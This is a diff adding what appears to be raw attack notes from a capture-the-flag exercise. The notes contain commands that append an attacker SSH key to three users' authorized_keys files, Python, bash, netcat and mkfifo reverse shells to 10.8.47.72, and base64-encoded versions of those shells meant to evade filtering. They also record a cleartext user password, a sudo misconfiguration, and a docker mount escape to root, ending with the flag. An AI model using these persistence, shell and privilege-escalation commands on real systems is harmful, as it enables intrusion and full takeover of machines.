@@ -1,0 +1,118 @@
+echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCrh/6qYKKvZb8m2GJ97xAKwULXl6gAIhk4+1hs+zz6IDpviqMZnx/QsmemVtAMbZJ14R8/1QF/VHRnRRG3DkNx+uRau9mngz8SbVamWvHZRCVLce4ygzGGQKVjLXz++wrwYuT00F0N0V1Zh+Rd+tgBXlHdAO2VdnpPApB6VlUBppd/G3OD0Ylxog6935kvyOsaFA3ixoFl6jtsnIZSHT67kQAoAgfg7uFptC9FrPAMlmK7rrKUBGmkJKG4qbREaoN+Dxk/D5YKdSvLWdAN2KZmi1X6Q74pLgtA5hkuOa9p05JltZYWXzAtaR20BJDUP2x6OsGfr3xIZUFNdgU0cguml5RDJ9RuhEYDpBObr8krZPgS/n0szjw9byDDlHmLAty8rl+G0oLMCkFcMdgEYC2qu+3hLlDDh6iIqOBv985em9IjJE9B0QcksfiDd1s9gSFadc538Y6xIf8/RSEFmxxjJm/Qy61EPib+k1BQhreOlGQvQNEQoNsp6ZuASPJnYHM= root@kali" >> /home/apaar/.ssh/authorized_keys
+
+
+
+
+echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCrh/6qYKKvZb8m2GJ97xAKwULXl6gAIhk4+1hs+zz6IDpviqMZnx/QsmemVtAMbZJ14R8/1QF/VHRnRRG3DkNx+uRau9mngz8SbVamWvHZRCVLce4ygzGGQKVjLXz++wrwYuT00F0N0V1Zh+Rd+tgBXlHdAO2VdnpPApB6VlUBppd/G3OD0Ylxog6935kvyOsaFA3ixoFl6jtsnIZSHT67kQAoAgfg7uFptC9FrPAMlmK7rrKUBGmkJKG4qbREaoN+Dxk/D5YKdSvLWdAN2KZmi1X6Q74pLgtA5hkuOa9p05JltZYWXzAtaR20BJDUP2x6OsGfr3xIZUFNdgU0cguml5RDJ9RuhEYDpBObr8krZPgS/n0szjw9byDDlHmLAty8rl+G0oLMCkFcMdgEYC2qu+3hLlDDh6iIqOBv985em9IjJE9B0QcksfiDd1s9gSFadc538Y6xIf8/RSEFmxxjJm/Qy61EPib+k1BQhreOlGQvQNEQoNsp6ZuASPJnYHM= root@kali" >> /home/anurodh/.ssh/authorized_keys
+
+
+
+
+echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCrh/6qYKKvZb8m2GJ97xAKwULXl6gAIhk4+1hs+zz6IDpviqMZnx/QsmemVtAMbZJ14R8/1QF/VHRnRRG3DkNx+uRau9mngz8SbVamWvHZRCVLce4ygzGGQKVjLXz++wrwYuT00F0N0V1Zh+Rd+tgBXlHdAO2VdnpPApB6VlUBppd/G3OD0Ylxog6935kvyOsaFA3ixoFl6jtsnIZSHT67kQAoAgfg7uFptC9FrPAMlmK7rrKUBGmkJKG4qbREaoN+Dxk/D5YKdSvLWdAN2KZmi1X6Q74pLgtA5hkuOa9p05JltZYWXzAtaR20BJDUP2x6OsGfr3xIZUFNdgU0cguml5RDJ9RuhEYDpBObr8krZPgS/n0szjw9byDDlHmLAty8rl+G0oLMCkFcMdgEYC2qu+3hLlDDh6iIqOBv985em9IjJE9B0QcksfiDd1s9gSFadc538Y6xIf8/RSEFmxxjJm/Qy61EPib+k1BQhreOlGQvQNEQoNsp6ZuASPJnYHM= root@kali" >> /home/aurick/.ssh/authorized_keys
+
+
+
+
+
+
+python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.8.47.72",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
+
+
+
+echo 'bash -i >& /dev/tcp/10.8.47.72/4444 0>&1' | base64 -d
+
+
+BASH
+`echo 'YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC44LjQ3LjcyLzQ0NDQgMD4mMQ==' | base64 -d`
+
+
+NETCAT
+`echo 'bmMgMTAuOC40Ny43MiA0NDQ0IC1lIC9iaW4vYmFzaA==' | base64 -d`
+
+
+PYTHON
+`echo 'cHl0aG9uIC1jICdpbXBvcnQgc29ja2V0LHN1YnByb2Nlc3Msb3M7cz1zb2NrZXQuc29ja2V0KHNvY2tldC5BRl9JTkVULHNvY2tldC5TT0NLX1NUUkVBTSk7cy5jb25uZWN0KCgiMTAuOC40Ny43MiIsNDQ0NCkpO29zLmR1cDIocy5maWxlbm8oKSwwKTsgb3MuZHVwMihzLmZpbGVubygpLDEpOyBvcy5kdXAyKHMuZmlsZW5vKCksMik7cD1zdWJwcm9jZXNzLmNhbGwoWyIvYmluL3NoIiwiLWkiXSk7Jw==' | base64 -d`
+
+
+
+
+
+echo rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.8.47.72 4444 >/tmp/f
+
+Chmod
+`echo 'Y2htb2QgK3ggL3RtcC9zaGVsbC5zaA==' | base64 -d`
+
+Lanciare comando
+`echo 'L3RtcC9zaGVsbC5zaA==' | base64 -d`
+
+
+
+
+
+
+User www-data may run the following commands on ubuntu:
+    (apaar : ALL) NOPASSWD: /home/apaar/.helpline.sh
+
+
+
+
+
+
+r"m" /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.8.47.72 1234 >/tmp/f
+
+anurodh:!d0ntKn0wmYp@ssw0rd
+
+
+
+
+anurodh@ubuntu:~$ docker run -it -v /:/mnt alpine chroot /mnt
+groups: cannot find name for group ID 11
+To run a command as administrator (user "root"), use "sudo <command>".
+See "man sudo_root" for details.
+
+root@043ec18b9c3a:/# 
+root@043ec18b9c3a:/# id
+uid=0(root) gid=0(root) groups=0(root),1(daemon),2(bin),3(sys),4(adm),6(disk),10(uucp),11,20(dialout),26(tape),27(sudo)
+root@043ec18b9c3a:/# 
+root@043ec18b9c3a:/# 
+root@043ec18b9c3a:/# ls
+bin   cdrom  etc   initrd.img      lib    lost+found  mnt  proc  run   snap  swap.img  tmp  var      vmlinuz.old
+boot  dev    home  initrd.img.old  lib64  media       opt  root  sbin  srv   sys       usr  vmlinuz
+root@043ec18b9c3a:/# cd root/
+root@043ec18b9c3a:~# ls
+proof.txt
+root@043ec18b9c3a:~# cat proof.txt 
+
+
+                                        {ROOT-FLAG: w18gfpn9xehsgd3tovhk0hby4gdp89bg}
+
+
+Congratulations! You have successfully completed the challenge.
+
+
+         ,-.-.     ,----.                                             _,.---._    .-._           ,----.  
+,-..-.-./  \==\ ,-.--` , \   _.-.      _.-.             _,..---._   ,-.' , -  `. /==/ \  .-._ ,-.--` , \ 
+|, \=/\=|- |==||==|-  _.-` .-,.'|    .-,.'|           /==/,   -  \ /==/_,  ,  - \|==|, \/ /, /==|-  _.-` 
+|- |/ |/ , /==/|==|   `.-.|==|, |   |==|, |           |==|   _   _\==|   .=.     |==|-  \|  ||==|   `.-. 
+ \, ,     _|==/==/_ ,    /|==|- |   |==|- |           |==|  .=.   |==|_ : ;=:  - |==| ,  | -/==/_ ,    / 
+ | -  -  , |==|==|    .-' |==|, |   |==|, |           |==|,|   | -|==| , '='     |==| -   _ |==|    .-'  
+  \  ,  - /==/|==|_  ,`-._|==|- `-._|==|- `-._        |==|  '='   /\==\ -    ,_ /|==|  /\ , |==|_  ,`-._ 
+  |-  /\ /==/ /==/ ,     //==/ - , ,/==/ - , ,/       |==|-,   _`/  '.='. -   .' /==/, | |- /==/ ,     / 
+  `--`  `--`  `--`-----`` `--`-----'`--`-----'        `-.`.____.'     `--`--''   `--`./  `--`--`-----``  
+
+
+--------------------------------------------Designed By -------------------------------------------------------
+                                        |  Anurodh Acharya |
+                                        ---------------------
+
+                                     Let me know if you liked it.
+
+Twitter
+        - @acharya_anurodh
+Linkedin
+        - www.linkedin.com/in/anurodh-acharya-b1937116a
+
+
+
+root@043ec18b9c3a:~# 
+
